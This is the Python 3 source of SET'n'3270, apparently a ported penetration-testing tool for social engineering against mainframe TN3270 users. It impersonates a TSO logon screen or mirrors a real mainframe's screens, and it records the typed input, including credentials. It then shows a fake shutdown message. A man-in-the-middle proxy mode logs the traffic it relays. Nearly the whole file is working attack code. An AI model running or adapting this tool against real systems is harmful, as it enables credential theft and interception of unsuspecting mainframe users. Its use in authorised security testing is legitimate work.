#!/usr/bin/env python3
#Written by Soldier of Fortran (Phil Young) - updated to Python3 by Kev Milne with help of ye old ChatGPT.
"""
SETn3270 Python 3 version, using cp037 instead of EBCDIC-CP-BE.
"""

import socket
import time
import ssl
import struct
import select
import random
import os
import sys
import signal
import binascii
import argparse
import threading

import tn3270lib

try:
    from OpenSSL import SSL
    openssl_available = True
except ImportError:
    print("[!!] OpenSSL Library not available. SSL MitM will be disabled.")
    openssl_available = False


class c:
    BLUE = "\033[94m"
    DARKBLUE = "\033[0;34m"
    PURPLE = "\033[95m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    WHITE = "\033[1;37m"
    ENDC = "\033[0m"
    DARKGREY = "\033[1;30m"

    def disable(self):
        self.BLUE = ""
        self.GREEN = ""
        self.YELLOW = ""
        self.DARKBLUE = ""
        self.PURPLE = ""
        self.WHITE = ""
        self.RED = ""
        self.ENDC = ""
        self.DARKGREY = ""


def send_tn(clientsock, data: bytes):
    """Send raw bytes to the client."""
    clientsock.sendall(data)


def recv_tn(clientsock, timeout=100) -> bytes:
    """Receive up to 1920 bytes from client, with a default timeout."""
    rready, _, _ = select.select([clientsock], [], [], timeout)
    if len(rready):
        data = clientsock.recv(1920)
    else:
        data = b""
    return data


def signal_handler(sig, frame):
    print(c.ENDC + "\nGAME OVER MAN!\n")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)


def fake_tso() -> bytes:
    """
    Return a mock TSO logon screen as raw bytes.
    All 'decode/encode' previously using 'EBCDIC-CP-BE' is replaced with 'cp037'.
    """
    tso_hex = (
        "05c71140403c4040401140401de8"
        "60606060606060606060606060606060"
        "606060606060606060606060606040e3e2d661c540d3d6c7d6d540606060"
        "606060606060606060606060606060606060606060606060606060606060"
        "6060606011c1501de8"
        "606060606060606060606060606060606060606060"
        "60606060606060606040E2C9C7C8C2C5D9C2C1D5D2406060606060606060"
        "606060606060606060606060606060606060606060606060606060604011"
        "c2601de84040404040404040404040404040404040404040404040404040"
        "404040404040404040404040404040404040404040404040404040404040"
        "404040404040404040404040404040404040404040404040115b601de8d7"
        "c6f161d7c6f1f3407e7e6e40c885939740404040d7c6f361d7c6f1f5407e"
        "7e6e40d3968796868640404040d7c1f1407e7e6e40c1a3a38595a3899695"
        "40404040d7c1f2407e7e6e40d985a28896a6115cf01de8e896a4409481a8"
        "40998598a485a2a340a29785838986898340888593974089958696999481"
        "a38996954082a8408595a385998995874081407d6f7d408995408195a840"
        "8595a399a840868985938411c3f31de8c595a3859940d3d6c7d6d5409781"
        "99819485a38599a24082859396a67a11c4e31de8d9c1c3c640d3d6c7d6d5"
        "40978199819485a38599a27a11c6d21de85ce4a285998984404040407e7e"
        "7e6e11c6e21dc8404040404040401df011c8f21d6040d781a2a2a6969984"
        "40407e7e7e6e11c9c21d4c00000000000000001df0114df21d6040c18383"
        "a340d5948299407e7e7e6e114ec21dc80000000000000000000000000000"
        "00000000000000000000000000000000000000000000000000001df0114b"
        "d21d6040d79996838584a49985407e7e7e6e114be21dc800000000000000"
        "001df01150d21d6040e289a9854040404040407e7e7e6e1150e21dc80000"
        "00000000001df011d2f21d6040d78599869699944040407e7e7e6e11d3c2"
        "1dc80000001df0114cc21d6040c79996a49740c9848595a340407e7e7e6e"
        "114cd51dc800000000000000001df011c9e21d6040d585a640d781a2a2a6"
        "969984407e7e7e6e11c9f51d4c00000000000000001df011d7f31de8c595"
        "a38599408195407de27d408285869699854085818388409697a389969540"
        "8485a2899985844082859396a67a1d6011d9c71de84011d9c91dc8401df0"
        "60d596948189931d6011d9d71de84011d9d91dc8401df060d5969596a389"
        "83851d6011d9e81de84011d96a1dc8001df060d985839695958583a31d60"
        "11d97a1de84011d97c1dc8401df060d6c9c483819984401d6011d5d21d60"
        "40c39694948195844040407e7e7e6e11d5e21dc800000000000000000000"
        "000000000000000000000000000000000000000000000000000000000000"
        "0000000000000000000000000000000000000000000000000000000000"
        "00000000000000000000001df011c7c21d7c40e285839381828593404040"
        "40407e7e7e6e11c7d51d7c40404040404040401df011c6e313"
    )
    return binascii.unhexlify(tso_hex)


def fake_goodbye(text: bytes = b"System Shutdown. Please connect to production LPAR."):
    """
    Create a simple final screen using EBCDIC cp037, plus a 3270 end-of-record.
    """
    prefix = binascii.unhexlify("05c21d40")
    suffix = binascii.unhexlify("11c47f1d4013")
    # Convert text from ASCII->EBCDIC (cp037)
    return prefix + text.decode("utf-8").encode("cp037") + suffix


def get_data(tn3270, data: bytes, buff: list) -> bytes:
    """
    Process an incoming 3270 data buffer from the client, storing typed data.
    Now uses cp037 in decode/encode calls.
    """
    if len(data) <= 5:
        return b""
    # Check if the client pressed ENTER (0x7d)
    if data[0:1] == tn3270lib.ENTER or data[5:6] == tn3270lib.ENTER:
        tn3270.msg(1, "AID Enter (0x7d) received!")
        if data[0:1] == tn3270lib.ENTER:  # tn3270 mode
            i = 1
        else:  # tn3270E mode
            i = 6
        # skip cursor_location
        cursor_location = data[i : i + 2]
        i += 2
        buff_addr = 0
        while i <= len(data) - 3:
            cp = data[i : i + 1]
            if cp == tn3270lib.SBA:
                tn3270.msg(1, "Set Buffer Address (SBA) 0x11")
                b1 = data[i + 1]
                b2 = data[i + 2]
                buff_addr = tn3270.DECODE_BADDR(b1, b2)
                tn3270.msg(1, "Buffer Address: %r", buff_addr)
                tn3270.msg(1, "Row: %r", tn3270.BA_TO_ROW(buff_addr))
                tn3270.msg(1, "Col: %r", tn3270.BA_TO_COL(buff_addr))
                i += 3
            else:
                # normal typed character
                ascii_char = cp.decode("cp037", errors="replace").encode("utf-8")
                tn3270.msg(1, "Inserting %r at location: %r", ascii_char, buff_addr)
                buff[buff_addr] = cp
                buff_addr = tn3270.INC_BUF_ADDR(buff_addr)
                i += 1
        # Build a Python bytes string from buff
        pbuff = b""
        for line in buff:
            if line == b"\x00":
                pbuff += b" "
            else:
                pbuff += line.decode("cp037", errors="replace").encode("utf-8")

        splitted = pbuff.split()
        tn3270.msg(1, "Received %r items", len(splitted))
        for idx, item in enumerate(splitted, start=1):
            print(f"[+] Line {idx}:", item.decode("utf-8", "replace"))
        return pbuff
    else:
        return b""


def logo():
    print(c.DARKBLUE)
    logoart = []
    logoart.append(
        r"""
.::::::. .,::::::  ::::::::::::: :: ::.    :::.  ::  .::.      .:::.  ...:::::
;;;`    ` ;;;;''''  ;;;;;;;;'''' ,' `;;;;,  `;;; ,' ;'`';;,   ,;'``;. '''``;;',
'[==/[[[[, [[cccc        [[          [[[[[. '[[      .n[[   ''  ,[['    .[' ,['  [n
  '''    $ $$""''        $$          $$$ "Y$c$$     ``"$$$. .c$$P'    ,$$'  $$    $$
 88b    dP 888oo,__      88,         888    Y88     ,,o888"d88 _,oo,  888   Y8,  ,8"
  "YMmMY"  "''YUMMM     MMM         MMM     YM     YMMP"  MMMUP*"^^  MMM    "YmmP
"""
    )
    logoart.append(
        r"""
.sSSSSs.    .sSSSSs.       .sSSSSSSSSs.                  .sSSSSSSs.  .sSSSSs.    SSSSSSSSSs. .sSSSSs.
SSSSSSSSSs. SSSSSSSSSs. .sSSSSSSSSSSSSSs. .sSSSs.  SSSSS `SSSS SSSSs `SSSS SSSs. SSSSSSSSSSS SSSSSSSSSs.
S SSS SSSS' S SSS SSSS' SSSSS S SSS SSSSS S SSS SS SSSSS       S SSS       SSSSS      S SSS  S SSS SSSSS
S  SS       S  SS       SSSSS S  SS SSSSS S  SS  `sSSSSS   .sS S  SS .sSSSsSSSS'     S  SS   S  SS SSSSS
`SSSSsSSSa. S..SSsss    `:S:' S..SS `:S:' S..SS    SSSSS  SSSSsS..SS S..SS          S..SS    S..SS\SSSSS
.sSSS SSSSS S:::SSSS          S:::S       S:::S    SSSSS   `:; S:::S S:::S SSSs.   S:::S     S:::S SSSSS
S;;;S SSSSS S;;;S             S;;;S       S;;;S    SSSSS       S;;;S S;;;S SSSSS  S;;;S      S;;;S SSSSS
S:::S SSSSS S:::S SSSSS       S:::S       S:::S    SSSSS .SSSS S:::S S:::S SSSSS S:::S       S:::S SSSSS
SSSSSsSSSSS SSSSSsSS;:'       SSSSS       SSSSS    SSSSS `:;SSsSSSSS SSSSSsSSSSS SSSSS       `:;SSsSS;:'"""
    )
    logoart.append(
        r"""
                               ##    #           ##
                              ##     ##         ##
    #### ######## ########   ##      ###  ##   ##      #######  #######  #######  #######
   ###               ###             #### ##                ##       ##       ##  ##   ##
   ###    #######    ###             #######             #####  #######       ##  ##   ##
   ###    ###        ###             ### ###                ##  ###           ##  ##   ##
#####     #######    ###             ###  ##           #######  #######       ##  #######
                                           #                                  ##         """
    )
    logoart.append(
        r"""
  ______  _______  _______  _         _  ______   ______   _______   _____
 / _____)(_______)(_______)( )       ( )(_____ \ (_____ \ (_______) (_____)
( (____   _____       _    |/  ____  |/  _____) )  ____) )      _   _  __ _
 \____ \ |  ___)     | |      |  _ \    (_____ (  / ____/      / ) | |/ /| |
 _____) )| |_____    | |      | | | |    _____) )| (_____     / /  |   /_| |
(______/ |_______)   |_|      |_| |_|   (______/ |_______)   (_/    \_____/"""
    )
    logoart.append(
        r"""
MP''''''`MM MM''''''''`M M''''''''M d8          d8 d8888b. d8888b. d88888P  a8888a
M  mmmmm..M MM  mmmmmmmM Mmmm  mmmM 88          88     `88     `88     d8' d8' ..8b
M.      `YM M`      MMMM MMMM  MMMM .P 88d888b. .P  aaad8' .aaadP'    d8'  88 .P 88
MMMMMMM.  M MM  MMMMMMMM MMMM  MMMM    88'  `88        `88 88'       d8'   88 d' 88
M. .MMM'  M MM  MMMMMMMM MMMM  MMMM    88    88        .88 88.      d8'    Y8'' .8P
Mb.     .dM MM        .M MMMM  MMMM    dP    dP    d88888P Y88888P d8'      Y8888P
MMMMMMMMMMM MMMMMMMMMMMM MMMMMMMMMM
"""
    )
    logoart.append(
        r"""
  _______   _______   _______   __           __   _______   _______   _______   _______
 |   _   | |   _   | |       | |  | .-----. |  | |   _   | |       | |   _   | |   _   |
 |   1___| |.  1___| |.|   | |  |_| |     |  |_| |___|   | |___|   | |___|   | |.  |   |
 |____   | |.  __)_  `-|.  |-'      |__|__|       _(__   |  /  ___/     /   /  |.  |   |
 |:  1   | |:  1   |   |:  |                     |:  1   | |:  1  \    |   |   |:  1   |
 |::.. . | |::.. . |   |::.|                     |::.. . | |::.. . |   |   |   |::.. . |
 `-------' `-------'   `---'                     `-------' `-------'   `---'   `-------'"""
    )
    print(random.choice(logoart), "\n")
    print(c.ENDC)


def printer(s):
    """Fake typed-out printer effect."""
    for ch in s:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(random.uniform(0, 0.15))
    print("\n", end=" ")


def printv(msg):
    """Print if in verbose mode (global args)."""
    if args.verbose:
        print(msg)


def get_all(sox: socket.socket) -> bytes:
    """Receive all available data until no more is ready or the socket closes."""
    data = b""
    while True:
        d = recv_tn(sox, 1)
        if not d:
            break
        data += d
    return data


def proxy_handler(clientsock, target, port, tn3270, delay=0.001):
    """Pass-through proxy. Will try SSL first, otherwise fallback to plaintext."""
    timeout = 3
    if args.verbose:
        print("[+] Proxy Started. Sending all packets to", target)
        print("[+] Connecting to", target, ":", port)

    try:
        print("[+] Trying SSL")
        plain = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_sock = ssl.wrap_socket(plain, cert_reqs=ssl.CERT_NONE)
        ssl_sock.connect((target, port))
        serversock = ssl_sock
    except ssl.SSLError as e:
        print(f"[!] SSL Error: {e}, trying plaintext next.")
        try:
            plain.close()
            sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock2.settimeout(timeout)
            sock2.connect((target, port))
            serversock = sock2
        except Exception as e2:
            print("[!] Socket Error:", e2)
            return
    except Exception as e:
        print(f"[!] Generic Error: {e}, trying plaintext next.")
        try:
            plain.close()
            sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock2.settimeout(timeout)
            sock2.connect((target, port))
            serversock = sock2
        except Exception as e2:
            print("[!] Socket Error:", e2)
            return

    print("[+] Connection complete. MitM proxy established!")

    connections = [clientsock, serversock]
    channel = {clientsock: serversock, serversock: clientsock}

    while True:
        time.sleep(delay)
        inputready, _, _ = select.select(connections, [], [], 5)
        for s in inputready:
            try:
                data = s.recv(1920)
            except ssl.SSLError as e:
                if "want read" in str(e).lower():
                    data = b""
                else:
                    data = b""
            if not data:
                print("[+] Disconnected:", s.getpeername())
                other = channel[s]
                connections.remove(s)
                connections.remove(other)
                other.close()
                s.close()
                del channel[other]
                del channel[s]
                return
            else:
                buff = [b"\x00"] * 1920
                _ = get_data(tn3270, data, buff)
                channel[s].sendall(data)


def handler(clientsock, addr, tn3270, screen, cmd_tracker, commands=False):
    """Handle a single inbound connection, do 3270 negotiation, show screens, etc."""

    # Start tn3270 negotiation
    send_tn(clientsock, tn3270lib.IAC + tn3270lib.DO + tn3270lib.options["TN3270"])
    tn3270.msg(1, "Sending: IAC DO TN3270")
    data = recv_tn(clientsock)
    if data == tn3270lib.IAC + tn3270lib.WILL + tn3270lib.options["TN3270"]:
        tn3270.msg(1, "Received Will TN3270, sending IAC DONT TN3270")
        send_tn(clientsock, tn3270lib.IAC + tn3270lib.DONT + tn3270lib.options["TN3270"])
        data = recv_tn(clientsock)

    if data != tn3270lib.IAC + tn3270lib.WONT + tn3270lib.options["TN3270"]:
        tn3270.msg(1, "Didn't negotiate tn3270 telnet options, quitting!")
        clientsock.close()
        return

    send_tn(clientsock, tn3270lib.IAC + tn3270lib.DO + tn3270lib.options["TTYPE"])
    tn3270.msg(1, "Sending: IAC DO TTYPE")
    data = recv_tn(clientsock)
    send_tn(
        clientsock,
        tn3270lib.IAC
        + tn3270lib.SB
        + tn3270lib.options["TTYPE"]
        + tn3270lib.SEND
        + tn3270lib.IAC
        + tn3270lib.SE,
    )
    data = recv_tn(clientsock)
    tn3270.msg(1, "Sending: IAC DO EOR")
    send_tn(clientsock, tn3270lib.IAC + tn3270lib.DO + tn3270lib.options["EOR"])
    data = recv_tn(clientsock)
    tn3270.msg(1, "Sending: IAC WILL EOR; IAC DO BINARY; IAC WILL BINARY")
    send_tn(
        clientsock,
        tn3270lib.IAC
        + tn3270lib.WILL
        + tn3270lib.options["EOR"]
        + tn3270lib.IAC
        + tn3270lib.DO
        + tn3270lib.options["BINARY"]
        + tn3270lib.IAC
        + tn3270lib.WILL
        + tn3270lib.options["BINARY"],
    )

    # Drain any leftover negotiation data
    data = get_all(clientsock)

    buff = [b"\x00"] * 1920
    current_screen = 0
    timing = 0

    # Send the first screen
    send_tn(clientsock, screen[current_screen] + tn3270lib.IAC + tn3270lib.TN_EOR)
    data = recv_tn(clientsock)

    not_done = True
    while not_done:
        if data == b"":
            break
        current_screen += 1

        if commands is not False:
            if timing >= len(commands):
                commands = False
                continue
            for current_command in commands:
                timing += 1
                buff = [b"\x00"] * 1920
                pbuff = get_data(tn3270, data, buff)
                try:
                    command_received = pbuff.split()[0].decode("utf-8", "replace")
                except (IndexError, AttributeError):
                    command_received = "AID"

                items_to_next_input = cmd_tracker.get(current_command, 999999)

                if command_received == current_command or current_command == "*":
                    if args.verbose:
                        print(
                            f"[+] Current Command: {current_command}, Received: {command_received}"
                        )
                        print(
                            f"[+] Current Screen: {current_screen}, items to next input: {items_to_next_input}"
                        )
                        print(f"[+] Command Tracker: {cmd_tracker}")

                    while current_screen < items_to_next_input:
                        send_tn(clientsock, screen[current_screen] + tn3270lib.IAC + tn3270lib.TN_EOR)
                        current_screen += 1

                    data = get_all(clientsock)
                    send_tn(clientsock, screen[current_screen] + tn3270lib.IAC + tn3270lib.TN_EOR)
                    data = get_all(clientsock)
                else:
                    print("[+] Displaying Dummy Screen")
                    send_tn(
                        clientsock,
                        fake_goodbye(args.goodbye.encode("utf-8"))
                        + tn3270lib.IAC
                        + tn3270lib.TN_EOR,
                    )
                    print("[+] Sleeping 5")
                    time.sleep(5)
                    not_done = False
                    break
        else:
            # no commands: just show a final screen and close
            buff = [b"\x00"] * 1920
            _ = get_data(tn3270, data, buff)
            print("[+] Displaying Dummy Screen")
            send_tn(
                clientsock,
                fake_goodbye(args.goodbye.encode("utf-8")) + tn3270lib.IAC + tn3270lib.TN_EOR
            )
            print("[+] Sleeping 5")
            time.sleep(5)
            break

    clientsock.close()
    print("[+] Connection Closed", addr)


parser = argparse.ArgumentParser(
    description=(
        "SET'n'3270: The Mainframe TN3270 Social Engineering Tool.\n\n"
        "Usage examples:\n"
        "  1) Fake TSO logon screen (no target)\n"
        "  2) Mirror a live mainframe (provide target), capturing commands\n"
        "  3) MITM proxy to intercept user input"
    )
)
parser.add_argument(
    "target",
    nargs="?",
    help="z/OS Mainframe TN3270 Server IP/Hostname. If omitted, shows fake TSO screen.",
)
parser.add_argument(
    "-p", "--port", help="TN3270 server port. Default=23", dest="port", default=23, type=int
)
parser.add_argument(
    "--proxy",
    help="Operate as a MITM proxy instead of a direct server or fake TSO.",
    dest="proxy",
    action="store_true",
    default=False,
)
parser.add_argument(
    "-c",
    "--commands",
    help='Commands to expect (ex: "logon;netview;tso"), used when mirroring mainframe screens.',
    dest="commands",
    default=False,
)
parser.add_argument(
    "-g",
    "--goodbye",
    help="Message displayed at session end. (default: System Shutdown...)",
    dest="goodbye",
    default="System Shutdown. Please connect to production LPAR.",
)
parser.add_argument(
    "--ssl", help="Force SSL connections (if possible).", default=False, action="store_true"
)
parser.add_argument(
    "-v", "--verbose", help="Verbose mode", default=False, action="store_true", dest="verbose"
)
parser.add_argument(
    "-d", "--debug", help="Debug mode (lots of output)", default=False, action="store_true", dest="debug"
)
parser.add_argument(
    "--altport",
    help="Alternative local port to accept connections. Otherwise uses -p/23.",
    dest="altport",
    default=False,
    type=int,
)
parser.add_argument(
    "--nossl",
    help="Disable SSL server even if the mainframe used SSL",
    default=False,
    action="store_true",
    dest="nossl",
)

args = parser.parse_args()

logo()

print("[+] Starting SET'n'3270")

tn = tn3270lib.TN3270()
if args.debug:
    tn.set_debuglevel(2)

commands = False
target_ssl = False
cmd_tracker = {}

if args.proxy:
    if args.target is None:
        print(c.RED + "[+] Proxy mode requires a real target. Exiting!" + c.ENDC)
        sys.exit(-1)

    listen_port = args.altport if args.altport else args.port
    print(f"[+] Starting passthrough mode on port {listen_port}")

    # Create our server socket
    if args.ssl and openssl_available and not args.nossl:
        print("[+] Creating SSL socket (server)")
        try:
            ctx = SSL.Context(SSL.SSLv23_METHOD)
            ctx.use_privatekey_file("setn3270_key")
            ctx.use_certificate_file("setn3270_cert")

            base_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            base_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            tnsock = SSL.Connection(ctx, base_socket)
            tnsock.bind(("", listen_port))
            tnsock.listen(5)

        except Exception as e:
            print(f"[!] Could not load setn3270_key/cert or create SSL: {e}")
            print("[!] Falling back to plaintext.")
            tnsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tnsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            tnsock.bind(("", listen_port))
            tnsock.listen(5)
    else:
        print("[+] Creating plaintext socket.")
        tnsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tnsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tnsock.bind(("", listen_port))
        tnsock.listen(5)

    print(f"[+] Waiting for incoming connections on port {listen_port}")
    while True:
        clientsock, addr = tnsock.accept()
        print("[+] Connection Received from:", addr)
        threading.Thread(target=proxy_handler, args=(clientsock, args.target, args.port, tn)).start()

else:
    # Connect to mainframe or create a fake TSO
    if args.target:
        print(f"[+] Connecting to {args.target}:{args.port}")
        if not tn.initiate(args.target, args.port):
            print(f"[!] Could not connect to {args.target}:{args.port}")
            sys.exit(-1)
        if args.verbose:
            print("[+] Current screen is:")
            tn.print_screen()

        if args.commands:
            commands = args.commands.split(";")
            print("[+] Sending Commands:", commands)
            for command in commands:
                if args.verbose:
                    print("[+] Sending Command:", command)
                if command == "*":
                    tn.send_cursor("fake")
                else:
                    tn.send_cursor(command)
                tn.get_all_data()
                cmd_tracker[command] = len(tn.raw_screen_buffer()) - 1
                if args.verbose:
                    print("[+] Current screen is:")
                    tn.print_screen()

        print("[+] Mainframe Screen Copy Complete")
        if args.verbose:
            print("[+] Closing Connection to Mainframe")
        tn.disconnect()
        screen = tn.raw_screen_buffer()
        target_ssl = tn.is_ssl()
    else:
        # No target => show fake TSO
        listen_port = args.altport if args.altport else args.port
        print("[+] No target specified. Creating fake TSO screen on port", listen_port)
        screen = [fake_tso()]

    # Now set up a listening socket
    listen_port = args.altport if args.altport else args.port
    if (target_ssl or args.ssl) and openssl_available and not args.nossl:
        print("[+] Creating SSL listening socket.")
        try:
            ctx = SSL.Context(SSL.SSLv23_METHOD)
            ctx.use_privatekey_file("setn3270_key")
            ctx.use_certificate_file("setn3270_cert")

            base_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            base_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            tnsock = SSL.Connection(ctx, base_socket)
            tnsock.bind(("", listen_port))
            tnsock.listen(5)
        except Exception as e:
            print(f"[!] Could not load setn3270_key/cert: {e}")
            print("[!] Using plaintext socket instead.")
            tnsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tnsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            tnsock.bind(("", listen_port))
            tnsock.listen(5)
    else:
        print("[+] Creating Plaintext Socket")
        tnsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tnsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tnsock.bind(("", listen_port))
        tnsock.listen(5)

    print("[+] Waiting for Incoming Connections on port", listen_port)
    while True:
        clientsock, addr = tnsock.accept()
        print("[+] Connection Received from:", addr)
        threading.Thread(
            target=handler,
            args=(clientsock, addr, tn, screen, cmd_tracker, commands),
        ).start()
